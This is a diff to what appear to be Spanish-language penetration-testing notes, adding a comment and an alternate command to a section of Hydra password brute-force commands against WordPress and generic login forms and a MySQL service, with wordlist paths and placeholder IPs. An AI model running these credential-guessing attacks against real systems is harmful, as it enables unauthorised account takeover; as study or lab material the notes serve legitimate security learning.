@@ -36,6 +36,8 @@ Esto se usa en el panel del admin de WordPress.
 ```python
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
+
+# Si al momento de hacer login en la pagina esta te muestra un mensaje d error, seria de esta manera. Donde colocaremos el mensaje de error en la sentencia. 
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 
 # Haremos un ataque de fuerza bruta a WordPress (Todo lo anterior lo obtenemos de la misma página web en 'form action=/login.php') y colocamos todas la etiquetas 
@@ -112,6 +114,7 @@ Esto se usa en el panel del admin de WordPress.
 
 ```python
 ❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> mysql
+❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://<IP>
 
 	# P = Ruta o archivo que contiene las passwd
 	# l = Un usuario en especifico para login 
